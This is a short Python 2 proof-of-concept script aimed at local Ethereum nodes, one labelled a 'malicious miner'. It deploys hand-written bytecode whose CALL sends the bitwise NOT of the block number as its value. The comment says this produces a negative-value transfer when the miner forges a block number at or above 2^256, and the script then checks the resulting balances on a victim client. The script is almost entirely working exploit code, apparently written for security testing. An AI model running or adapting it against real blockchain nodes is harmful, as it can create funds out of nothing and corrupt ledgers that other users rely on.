#!/bin/python2
import httplib
import urllib
import json
import sys
import time

# malicious miner
mhost = 'localhost'
mport = 8080

# client
chost = 'localhost'
cport = 8081

mconn = httplib.HTTPConnection(mhost, mport)
cconn = httplib.HTTPConnection(chost, cport)
headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}

def send(conn, data):
    conn.request("POST", "", json.dumps(data), headers)
    response = conn.getresponse()
    return json.loads(response.read())["result"][2:]

def create_contract(conn, hexContract):
    data = {"jsonrpc":"2.0","method":"eth_transact","params":[],"id":1}
    data["params"] = [{"data":hexContract}]
    return send(conn, data)

def balance(conn, addr):
    data = {"jsonrpc":"2.0","method":"eth_balanceAt","params":[],"id":1}
    data["params"] = [addr]
    return send(conn, data)

receiver = 20*'00'
# creates a transaction that sends a transaction with negative value
# if the miner created a block with a number >= 2^256
def numberContract():
    # CALL arguments: retSize retOffset insize inOffset value addr gas CALL
    # PUSH1 0 PUSH1 0 PUSH1 0 PUSH1 0 NUMBER NOT PUSH20 someAddr PUSH1 0 CALL
    return 4*'6000' + '4319' + '73' + receiver + '60ff' + 'f1'

addr = create_contract(mconn, numberContract())
print 'Create fresh contract zero initial balance. Address:', addr
print 'Press enter when the client received the block.'
sys.stdin.read(1)
print 'Contract balance:', balance(cconn, addr)
print 'Receiver balance:', balance(cconn, receiver)
